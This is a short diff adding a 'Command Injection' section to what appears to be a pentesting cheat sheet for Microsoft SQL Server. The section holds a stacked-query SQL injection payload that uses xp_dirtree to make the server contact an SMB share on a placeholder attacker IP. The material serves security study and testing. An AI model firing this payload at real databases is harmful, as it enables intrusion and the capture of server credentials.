@@ -15,6 +15,13 @@ select * from <db-name>..<table-name>;
 select * from <db-name>.dbo.<table-name>;
 ```
 
+# Command Injection
+## `xp_cmdshell`
+
+## Stacked Queries
+```
+500'; EXEC xp_dirtree '\\10.10.10.10\sharename\file';-- -
+```
 
 
 
